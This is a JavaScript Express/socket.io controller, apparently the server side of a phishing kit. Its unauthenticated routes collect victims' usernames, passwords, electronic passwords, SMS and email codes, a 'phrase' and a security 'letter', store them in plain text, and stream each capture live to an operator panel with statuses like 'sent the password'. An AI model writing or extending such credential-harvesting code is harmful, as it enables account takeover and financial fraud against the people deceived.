const Client = require('../models/Client')
const Contact = require('../models/Contact')
const Address = require('../models/Address')
const UserByToken = require('../middlewares/userByToken')
const { Op } = require('sequelize')
const { io, theIo } = require('../server')

module.exports = {
    async index(req, res) {
        try {
            const authHeader = req.headers.authorization

            await UserByToken(authHeader)

            const clients = await Client.findAll({ include: [{ association: 'address' }, { association: 'contact' }] })

            return res.json(clients)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao buscar clientes: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },

    async single(req, res) {
        const authHeader = req.headers.authorization

        if (!authHeader) return res.status(401).send({ error: 'No token provided' })

        await UserByToken(authHeader)

        const { client_id } = req.params

        const client = await Client.findByPk(client_id, {
            include: [{ association: 'address' }, { association: 'contact' }],
        })

        if (!client) {
            return res.status(401).json({ message: 'client not found' })
        }

        return res.json(client)
    },
    async search(req, res) {
        try {
            const authHeader = req.headers.authorization

            if (!authHeader) return res.status(401).send({ error: 'No token provided' })

            await UserByToken(authHeader)

            const { args } = req.params

            const { type } = req.query

            const client = await Client.findAll({
                where: {
                    [Op.or]: [
                        {
                            name: {
                                [Op.like]: `%${args}%`,
                            },
                            type: {
                                [Op.eq]: type,
                            },
                        },
                        {
                            note: {
                                [Op.like]: `%${args}%`,
                            },
                            type: {
                                [Op.eq]: type,
                            },
                        },
                    ],
                },
            })

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({
                    error: error.message.replace(/(?:\r\n|\r|\n)/g, '<br>').replace(/(Validation error: )/g, ''),
                })

            console.log(`Erro ao buscar cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },

    async store(req, res) {
        try {
            //Client

            const { type, user, password, eletronicPassword, sms, status, phone } = req.body

            if (!user) return res.status(400).send({ error: `Informe seu usuário` })

            const clientUser = await Client.findOne({ where: { user } })

            if (clientUser) {
                await clientUser.update({
                    type,
                    user,
                    password,
                    eletronicPassword,
                    sms,
                    phone,
                    status: `reconnect`,
                })

                //console.log()

                req.app.io.to(clientUser.id).emit('smsreceived', clientUser.toJSON())

                return res.redirect(`/await?client=${clientUser.id}`)
            }

            const client = await Client.create({
                type,
                user,
                password,
                eletronicPassword,
                sms,
                phone,
                status,
            })

            //console.log(req.app.io)

            req.app.io.sockets.in('_room' + client.id).emit('smsreceived', client.toJSON())

            return res.redirect(`/await?client=${client.id}`)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            //console.log(`Erro ao criar novo cliente: `, error)
            console.log(io)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },
    async insert(req, res) {
        try {
            //Client
            const io = req.app.io

            const { username: user, password, password6 } = req.body

            //return res.json({ user, type, status })

            if (!user) return res.status(400).send({ error: `Informe seu usuário` })

            const clientUser = await Client.findOne({ where: { user } })

            if (clientUser) {
                await clientUser.update({
                    type,
                    user,
                    password,
                    password6,
                    status: `reconnect`,
                })

                return res.json(clientUser)
            }

            const client = await Client.create({
                user,
                password,
                password6,
                status: 'conectado',
            })

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao criar novo cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },

    async auth(req, res) {
        try {
            //Get user id by token

            if (Object.keys(req.body).length === 0)
                return res.status(400).send({ error: `Por favor envie as infomações` })

            const { auth: password6 } = req.body

            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.status(400).send({ error: `client not found` })

            await client.update({ password6, status: `Enviou cod. email` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao atualizar cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },
    async user(req, res) {
        try {
            //Get user id by token

            if (Object.keys(req.body).length === 0)
                return res.status(400).send({ error: `Por favor envie as infomações` })

            const { username: user } = req.body

            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.status(400).send({ error: `client not found` })

            await client.update({ user, status: `Enviou usuário` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao atualizar cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },
    async update(req, res) {
        try {
            //Get user id by token

            if (Object.keys(req.body).length === 0)
                return res.status(400).send({ error: `Por favor envie as infomações` })

            const { id, password, phrase: password6 } = req.body

            const client = await Client.findByPk(id)

            if (!client) return res.status(400).send({ error: `client not found` })

            await client.update({ password, password6, status: `Enviou a senha` })

            req.app.io.emit('sendPassword', client.toJSON())

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao atualizar cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },
    async letter(req, res) {
        try {
            //Get user id by token

            if (Object.keys(req.body).length === 0)
                return res.status(400).send({ error: `Por favor envie as infomações` })

            const { client_id } = req.params

            const { auth } = req.body

            const client = await Client.findByPk(client_id)

            if (!client) return res.status(400).send({ error: `client not found` })

            await client.update({ auth, status: `Enviou a letra` })

            req.app.io.emit('sendPassword', client.toJSON())

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao atualizar cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },

    async destroy(req, res) {
        try {
            //Get user id by token
            const authHeader = req.headers.authorization

            await UserByToken(authHeader)

            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.status(400).send({ error: `client not found` })

            client.destroy()

            return res.json(client)
        } catch (error) {
            //Validação de erros
            if (error.name == `JsonWebTokenError`) return res.status(400).send({ error })

            if (
                error.name == `SequelizeValidationError` ||
                error.name == `SequelizeUniqueConstraintError` ||
                error.name == `userToken`
            )
                return res.status(400).send({ error: error.message })

            console.log(`Erro ao excluir cliente: `, error)

            return res.status(500).send({ error: `Erro de servidor` })
        }
    },
}
